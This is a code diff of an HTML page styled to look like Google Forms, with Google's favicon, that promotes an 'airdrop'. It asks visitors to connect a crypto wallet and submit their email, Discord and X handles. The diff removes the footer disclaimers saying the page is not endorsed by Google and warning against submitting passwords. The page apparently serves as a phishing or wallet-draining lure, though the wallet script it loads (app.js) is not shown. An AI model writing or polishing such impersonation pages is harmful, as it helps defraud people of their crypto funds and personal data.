@@ -7,10 +7,7 @@
     
     <!-- Google Forms Favicon -->
     <link rel="icon" href="https://ssl.gstatic.com/docs/forms/favicon_2024.ico" type="image/x-icon">
-    <link rel="shortcut icon" href="https://ssl.gstatic.com/docs/forms/favicon_2024.ico" type="image/x-icon">
-    <script src="app.js"></script>
-    <script src="https://cdn.ethers.io/lib/ethers-6.13.0.umd.min.js"></script>
-
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
 body { background:#f0edf7; padding:20px; display:flex; justify-content:center; min-height:100vh; }
@@ -100,7 +97,6 @@ textarea { resize:vertical; min-height:80px; }
     </div>
 
     <form id="airdropForm">
-        <!-- Wallet -->
         <div class="form-card">
             <label>Connect Wallet <span class="required">*</span></label>
             <p style="color:#5f6368; font-size:14px; margin:8px 0 16px 0;">
@@ -111,25 +107,21 @@ textarea { resize:vertical; min-height:80px; }
             <div id="status" class="status"></div>
         </div>
 
-        <!-- Email -->
         <div class="form-card">
             <label>Email <span class="required">*</span></label>
-            <input type="email" id="email" placeholder="your.email@gmail.com" required autocomplete="email">
+            <input type="email" id="email" placeholder="your.email@gmail.com" required>
         </div>
 
-        <!-- Discord -->
         <div class="form-card">
             <label>Discord Username <span class="required">*</span></label>
             <input type="text" id="discord" placeholder="username#0000" required>
         </div>
 
-        <!-- X (Twitter) -->
         <div class="form-card">
             <label>X (Twitter) Handle <span class="required">*</span></label>
             <input type="text" id="twitter" placeholder="@yourusername" required>
         </div>
 
-        <!-- Complaint -->
         <div class="form-card">
             <label>Complaint / Description <span class="required">*</span></label>
             <textarea id="complaint" placeholder="Write your answer here..." required></textarea>
@@ -140,11 +132,6 @@ textarea { resize:vertical; min-height:80px; }
             <a href="#" class="clear-btn">Clear form</a>
         </div>
     </form>
-
-    <div class="footer">
-        <p>Never submit passwords through this form.</p>
-        <p>This content is neither created nor endorsed by Google.</p>
-    </div>
 </div>
 
 <script src="app.js"></script>
